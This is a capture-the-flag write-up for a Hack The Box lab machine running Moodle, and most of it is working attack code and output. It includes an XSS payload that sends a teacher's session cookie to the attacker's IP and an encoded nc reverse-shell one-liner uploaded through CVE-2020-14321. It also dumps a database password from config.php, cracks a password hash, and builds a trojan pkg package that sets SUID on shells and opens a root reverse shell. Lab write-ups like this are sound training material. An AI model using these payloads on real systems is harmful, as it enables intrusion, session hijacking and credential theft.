# Notes for Schooled
# -Foothold
## Gobuster
Directory bruteforcing returned nothing
Vhost bruteforcing found `moodle.schooled.htb`

Appears to be moodle 3.9.0, vulnerable to many XSS's
Registering as a student and enrolling in Mathematics, the teacher informed that he would be visiting student's profile pages, which is vulnerable to XSS
Inject the code:
```javascript
<img src=x onerror=this.src="http://10.10.14.28/?c="+document.cookie>
```
to MoodleNet profile field to steal phillips' `MoodleSession` cookie
```bash
$ nc -lp 80
Ncat: Version 7.91 ( https://nmap.org/ncat )
GET /?c=MoodleSession=cl0vfvt7o1raqaj94rdtc0ejjp HTTP/1.1
Host: 10.10.14.28
User-Agent: Mozilla/5.0 (X11; FreeBSD amd64; rv:86.0) Gecko/20100101 Firefox/86.0
Accept: image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://moodle.schooled.htb/moodle/user/profile.php?id=29
```

After getting teacher account, exploit the site with cve-2020-14321 to obtain admin access and upload a reverse shell
```
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.28%201234%20%3E%2Ftmp%2Ff
```

# -User
```php
$ cat /usr/local/www/apache24/data/moodle/config.php
<?php  // Moodle configuration file

unset($CFG);
global $CFG;
$CFG = new stdClass();

$CFG->dbtype    = 'mysqli';
$CFG->dblibrary = 'native';
$CFG->dbhost    = 'localhost';
$CFG->dbname    = 'moodle';
$CFG->dbuser    = 'moodle';
$CFG->dbpass    = 'PlaybookMaster2020';
$CFG->prefix    = 'mdl_';
$CFG->dboptions = array (
  'dbpersist' => 0,
  'dbport' => 3306,
  'dbsocket' => '',
  'dbcollation' => 'utf8_unicode_ci',
);

$CFG->wwwroot   = 'http://moodle.schooled.htb/moodle';
$CFG->dataroot  = '/usr/local/www/apache24/moodledata';
$CFG->admin     = 'admin';

$CFG->directorypermissions = 0777;

require_once(__DIR__ . '/lib/setup.php');

// There is no php closing tag in this file,
// it is intentional because it prevents trailing whitespace problems!
```
```bash
$ export PATH=$PATH:/usr/local/bin
$ mysql --user=moodle --password moodle
Enter password: PlaybookMaster2020
use moodle;
select * from mdl_user;
```
crack the hash with hashcat
```text
$ hashcat -a 0 -m 3200 hash.txt rockyou.txt
...
$2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW:!QAZ2wsx
...
```
ssh
```bash
$ ssh jamie@10.10.10.234
```

# -Root
```bash
$ sudo -l
User jamie may run the following commands on Schooled:
    (ALL) NOPASSWD: /usr/sbin/pkg update
    (ALL) NOPASSWD: /usr/sbin/pkg install *
```
Create trojan package with this `setup.sh` script
```bash
#!/bin/sh

STAGEDIR=/home/jamie/pkg
mkdir -p ${STAGEDIR}

cat >> ${STAGEDIR}/+PRE_INSTALL <<EOF
chmod +s /usr/local/bin/bash
chmod +s /usr/local/bin/sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.28 1234 >/tmp/f
EOF

cat >> ${STAGEDIR}/+MANIFEST <<EOF
name: mypackage
version: "1.0_5"
origin: sysutils/mypackage
comment: "automates stuff"
desc: "automates tasks which can also be undone later"
maintainer: john@doe.it
www: https://doe.it
prefix: /
EOF

mkdir -p ${STAGEDIR}/usr/local/etc
echo "# hello world" > ${STAGEDIR}/usr/local/etc/my.conf
echo "/usr/local/etc/my.conf" > ${STAGEDIR}/plist

pkg create -m ${STAGEDIR}/ -r ${STAGEDIR}/ -p ${STAGEDIR}/plist -o .
```
Either
```bash
# On local machine
$ nc -lvnp 1234
```
or
```bash
# On the box
$ bash -p
# whoami
root
```